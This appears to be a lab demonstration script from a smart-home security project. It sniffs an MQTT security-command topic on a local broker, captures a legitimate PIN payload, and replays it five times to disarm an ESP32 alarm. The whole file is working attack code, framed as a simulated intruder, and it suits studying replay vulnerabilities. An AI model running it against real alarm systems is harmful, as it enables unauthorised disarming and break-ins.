import paho.mqtt.client as mqtt
import time
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# --- Configuration ---
BROKER_IP = os.getenv("MQTT_BROKER_LOCAL", "localhost")
CMD_TOPIC = os.getenv("MQTT_TOPIC_SECURITY_CMD", "shtsp/home/security/cmd")
PORT = int(os.getenv("MQTT_PORT", "1883"))

captured_payload = None

# This function runs when the hacker "sniffs" your message
def on_message(client, userdata, msg):
    global captured_payload
    captured_payload = msg.payload.decode()
    print(f"\n🕵️ SNIFFER: Captured legitimate command -> {captured_payload}")
    print("Stopping sniffer... Target payload saved in memory.")
    client.disconnect() # Stop sniffing now that we have the 'key'

# --- PHASE 1: SNIFFING ---
print("📡 Phase 1: Sniffing network for a 'PIN' command...")
print("ACTION REQUIRED: Go to MQTT Explorer and send the PIN now!")

sniff_client = mqtt.Client(client_id="Hacker_Sniffer", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
sniff_client.on_message = on_message
sniff_client.connect(BROKER_IP, PORT)
sniff_client.subscribe(CMD_TOPIC)
sniff_client.loop_forever()

# --- PHASE 2: PERSISTENCE (WAITING) ---
print("\n⏱️ Phase 2: Waiting 15 seconds (Simulating the homeowner leaving)...")
time.sleep(15)

# --- PHASE 3: THE INJECTION (THE ATTACK) ---
if captured_payload:
    print(f"🔥 Phase 3: REPLAYING CAPTURED COMMAND: {captured_payload}")
    replay_client = mqtt.Client(client_id="Hacker_Replay_Device", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    replay_client.connect(BROKER_IP, PORT)
    replay_client.loop_start()
    
    # We send it 5 times rapidly to ensure the hack is recorded in the CSV
    for i in range(5):
        replay_client.publish(CMD_TOPIC, captured_payload)
        print(f"[{i+1}] Injected replayed packet...")
        time.sleep(0.5)
    
    replay_client.loop_stop()
    replay_client.disconnect()
    print("\n✅ Replay Attack Finished. ESP32 should now be DISARMED.")